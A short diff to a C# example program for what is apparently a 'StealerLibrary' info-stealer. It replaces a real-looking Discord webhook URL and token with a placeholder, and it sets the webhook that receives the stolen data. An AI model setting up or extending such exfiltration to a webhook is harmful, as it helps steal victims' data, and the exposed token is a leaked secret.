@@ -20,7 +20,7 @@ namespace Example
         private static void Main()
         {
             //Discord Webhook Method
-            Library.DiscordWebhookUrl = "https://discord.com/api/webhooks/837357865609199646/4wIlD35Q9QNdLGEfh9hWeoQX9eAMxCBqDQcMmIBBvAtoFTjDlJAzkMaxyc1kcxaY4TpP";
+            Library.DiscordWebhookUrl = "https://discord.com/api/webhooks/example/example";
             Library.WebhookName = "StealerLibrary"; //Optional
             Library.WebhookProfilePictureUrl = ""; //Optional
             
